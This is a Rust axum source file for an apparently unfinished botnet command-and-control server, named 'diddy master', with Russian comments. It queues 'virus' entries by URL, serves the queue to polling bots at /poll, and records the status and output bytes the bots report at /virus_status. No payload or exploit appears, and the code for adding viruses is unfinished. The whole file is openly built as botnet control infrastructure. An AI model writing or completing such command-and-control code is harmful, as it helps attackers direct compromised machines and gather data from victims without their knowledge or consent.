use axum::{
    Json, Router,
    extract::State,
    routing::{get, post},
};
use serde::{Deserialize, Serialize};
use std::{collections::HashMap, sync::Arc};
use tokio::sync::Mutex;

/// TODO: регистрация diddy, добавление вируса

#[derive(Clone, Serialize, Deserialize)]
struct Virus {
    id: u64,
    url: String,
    status: String,
    out: Option<Vec<u8>>,
}

async fn add_virus(botnetstate: &Arc<BotnetState>, url: &str) {
    let mut que = botnetstate.que.lock().await;

    // push (Virus {id: botnetstate[-1].id + 1, bytes: virus, status: "edging"})
    let id = que.last().map(|last| last.id + 1).unwrap_or(1);
    que.push(Virus {
        id,
        url: url.to_string(),
        status: "edging".to_owned(),
        out: None,
    });

    // always sort by id after push
    que.sort_by_key(|virus| virus.id);
}

struct BotnetState {
    que: Mutex<Vec<Virus>>,
    pro: Mutex<HashMap<String, u64>>, // ip -> id вируса
}

#[tokio::main]
async fn main() {
    let state = Arc::new(BotnetState {
        que: Mutex::new(Vec::new()),
        pro: Mutex::new(HashMap::new()),
    });
    let master = Router::new()
        .route("/poll", get(poll_handler))
        .route("/virus_status", post(virus_status_handler))
        .with_state(state);

    let listener = tokio::net::TcpListener::bind("0.0.0.0:6767").await.unwrap();
    println!(
        "diddy master listening on http://{}",
        listener.local_addr().unwrap()
    );
    axum::serve(listener, master).await.unwrap();
}

async fn poll_handler(State(state): State<Arc<BotnetState>>) -> Json<Vec<Virus>> {
    let que = state.que.lock().await; // отправляем всю очередь вирусов так чтобы его можно было сереализовать обратно в вектор
    Json(que.clone())
}

// примнять важные  вычисления
#[derive(Deserialize)]
struct VirusResult {
    id: u64,
    status: String,
    out: Vec<u8>,
}

async fn virus_status_handler(
    State(state): State<Arc<BotnetState>>,
    Json(body): Json<VirusResult>,
) -> String {
    let mut que = state.que.lock().await;
    match body.status.as_str() {
        "cooked" => set_virus_result(&mut que, &body),
        "fifty" => set_virus_result(&mut que, &body),
        unknown => format!("virus {}: прислал хуйню {unknown}", body.id),
    }
}

fn set_virus_result(que: &mut Vec<Virus>, body: &VirusResult) -> String {
    // binary search by body.id
    match que.binary_search_by_key(&body.id, |virus| virus.id) {
        Ok(index) => {
            que[index].status = body.status.clone();
            que[index].out = Some(body.out.clone());
            format!("virus {} is {}", body.id, body.status)
        }
        Err(_) => format!("virus {} not found in que", body.id),
    }
}
